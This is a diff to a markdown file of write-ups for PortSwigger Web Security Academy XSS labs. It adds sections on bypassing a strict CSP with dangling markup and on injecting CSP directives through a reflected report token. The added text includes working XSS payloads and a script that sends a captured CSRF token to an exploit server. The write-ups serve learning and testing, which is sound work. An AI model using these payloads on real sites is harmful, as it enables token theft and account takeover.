@@ -3,6 +3,7 @@
 - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 - https://portswigger.net/web-security/cross-site-scripting/contexts
 - https://portswigger.net/research/xss-without-parentheses-and-semi-colons
+- https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
 
 ## Reflected XSS into HTML context with nothing encoded
 
@@ -367,3 +368,53 @@ Accessing `/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,windo
 As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window."
 
 Contents of the tags are being html decoded when run, but as it turns out, the content of the `href` with usage of `javascript:` pseudo-schema performs url decoding before running. Here the problem was that spaces were encoded as `+` signs, so in order to solve this `/**/` trick was required.
+
+## Reflected XSS protected by very strict CSP, with dangling markup attack
+
+The page has very restrictive CSP policy, which does not allow any requests to other domains for images, scripts, styles etc. Additionally `base-uri` is set to `none`.
+
+Because we cannot make any cross domain requests, we can keep in mind, that `window` object is persistent throughout the lifetime of a tab and can potentially hold the value after redirects for our malicious use.
+
+We can notice that the email change form value is being populated by query param `email` and is not properly sanitized, so accessing the below url will break `input` tag `value` attribute and try to trigger XSS, which will be blocked by CSP.
+
+```
+/my-account?email=" tabindex=0 autofocus onfocus=alert(1) x="
+```
+
+Because we cannot make any cross domain request, we can make use of `<base>` tag. Using the `target` attribute on the `base` tag we can change the `window.name` of every link on the page. By injecting an incomplete target attribute the `window.name` will be set with all the markup after the injection until the corresponding quote on every link on the page.
+
+Using the below payload we are able to inject new clickable link which will change the `window.name` value to part of the page containing csrf token.
+
+```
+/my-account?email="><a href="https://exploit-0a180064044712f983b2775101a500c9.exploit-server.net/exploit">Click me</a><base target='
+```
+
+By constructing the page with payload below, the user, if no `window.name` is present, will be redirected to user details page containing a link with a `base` tag. When the link is clicked the `window.name` will be changed to the part of the page containing csrf token and then when visited again containing it, another request to log it on our server will be performed.
+
+```
+<script>
+if(window.name) {
+    new Image().src='//exploit-0a180064044712f983b2775101a500c9.exploit-server.net?'+encodeURIComponent(window.name);
+} else {
+    location = 'https://0af20088042a12618359789900cc0034.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a180064044712f983b2775101a500c9.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
+}
+</script>
+```
+
+Unfortunately (due to MDN) modern browsers reset `window.name` parameter on new page from different domain load and on Chrome this exploit is not possible anymore. I was able to successfuly do it on Firefox instead, but it does not work for the victim.
+
+Tries of creating dangling markup with `a` tag for `href` attribute failed for this lab, since the victim requires `Click` string, which I was not able to set using various attributes such as `value`.
+
+The rest would be to intercept the email change request, create autosubmit `form` from `csrf poc generator`, change the csrf token to the token for a valid user and send this payload to the victim, which would solve the lab.
+
+## Reflected XSS protected by CSP, with CSP bypass
+
+We can inject `<script>alert(1)</script>` to the search and notice, that the value is being reflected, but the script is being stopped by CSP.
+
+We can also notice `report-uri` CSP directive, which is now deprecated, but still supported by some browsers. After every CSP error it will send a report to provided url `/csp-report?token=`.
+
+When we access violating CSP url and specify our own `token` query param `/?search=<script>alert%281%29<%2Fscript>&token=111`, we can observe it is being reflected in the response CSP header `/csp-report?token=111`.
+
+By properly setting the `token` query param, we can inject our own CSP directives, allowing `script` tag execution: `token=; script-src-elem 'unsafe-inline'`.
+
+Now accessing `/?search=<script>alert(1)</script>&token=; script-src-elem 'unsafe-inline'` triggers XXS and solves the lab.
